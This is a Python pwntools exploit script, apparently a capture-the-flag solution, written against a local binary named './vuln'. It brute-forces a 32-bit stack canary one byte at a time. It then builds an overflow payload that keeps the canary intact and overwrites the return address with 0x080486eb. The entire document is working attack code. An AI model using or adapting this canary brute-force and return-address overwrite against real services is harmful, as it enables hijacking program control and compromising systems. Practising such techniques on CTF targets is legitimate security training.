#!/usr/bin/env python
# Author : 0xsegf
# https://github.com/arjunshibu
# https://www.hackthebox.eu/home/users/profile/201892
from pwn import *

elf = ELF('./vuln', checksec=False)
'''
setting stack canary
python -c 'from pwn import *; sys.stdout.write(p32(0xcafebabe))' > canary.txt
'''
def get_canary():
	junk = 'A' * 32
	canary = ''
	start_time = time.time()
	with log.progress('Bruteforcing stack canary') as l:
		for i in range(1, 5):
			for x in range(256):
				byte = struct.pack('B', x)
				context.log_level = 'critical'
				p = elf.process()
				p.recvuntil('>')
				p.sendline('56')
				p.recvuntil('>')
				p.send(junk + byte)
				resp = p.recvall()
				p.close()
				context.log_level = 'info'
				l.status('Trying {}th byte: {}'.format(i, hex(x)))
				if 'Ok' in resp:
					junk += byte
					canary += byte
					log.info('Found byte {}: {}'.format(i, hex(u32(byte.ljust(4, '\x00')))))
					if i == 4:
						canary = u32(canary.ljust(4, '\x00'))
						l.success('SUCCESS: {}'.format(hex(canary)))
					break
		log.info('Time elapsed : {:0.2f}'.format(time.time() - start_time))
		return canary
context.log_level = 'critical'
p = elf.process()
expl = 'A' * 32
expl += p32(get_canary())	# canary
expl += 'A' * 16
expl += p32(0x080486eb) 	# ret

p.recvuntil('>')
p.sendline('56')
p.recvuntil('>')
p.send(expl)
resp = p.recvall()
print resp